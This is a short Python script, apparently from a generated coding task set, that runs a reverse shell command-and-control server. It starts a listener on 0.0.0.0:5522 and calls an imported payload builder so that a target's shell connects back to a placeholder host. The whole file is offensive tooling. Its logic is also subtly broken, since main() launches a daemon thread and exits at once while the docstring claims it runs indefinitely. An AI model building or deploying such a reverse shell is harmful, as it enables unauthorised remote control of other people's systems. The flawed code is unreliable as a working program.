import threading
from data.code_scripts_PAST.stage3_DIMOS_test_v3.TASK_002_socket_utils import listen_for_connections
from data.code_scripts_PAST.stage3_DIMOS_test_v3.TASK_003_payload_builder import build_reverse_shell_payload
from data.code_scripts_PAST.stage3_DIMOS_test_v3.TASK_001_models import ExecutionResult


def main() -> None:
    """Main orchestrator that starts the reverse shell listener server.
    
    Starts a background thread listening on 0.0.0.0:5522 for incoming
    reverse shell connections and spawns interactive shells via subprocess.
    
    Returns:
        None. Runs indefinitely until interrupted.
    """
    print('Starting reverse shell server on 0.0.0.0:5522...')
    listener_thread = threading.Thread(target=listen_for_connections, args=('0.0.0.0', 5522))
    listener_thread.daemon = True
    listener_thread.start()
    print('Listener thread started. Waiting for connections...')


def execute_remote_command(host: str = '192.168.x.x', port: int = 5522) -> ExecutionResult:
    """Execute a remote command via the reverse shell server.
    
    Spawns an interactive shell process that connects back to the C2 server,
    allowing remote command execution through the listening socket.
    
    Args:
        host: The target host for the reverse shell connection (default '192.168.x.x').
        port: The target port for the reverse shell connection (default 5522).
        
    Returns:
        ExecutionResult object containing stdout, stderr, return_code, command, and timestamp.
    """
    result = build_reverse_shell_payload(host=host, port=port)
    print(f'Command executed: {result.command}')
    print(f'Return Code: {result.return_code}')
    if result.stdout:
        print(f'Stdout:\n{result.stdout}')
    if result.stderr:
        print(f'Stderr:\n{result.stderr}')
    return result


if __name__ == '__main__':
    main()
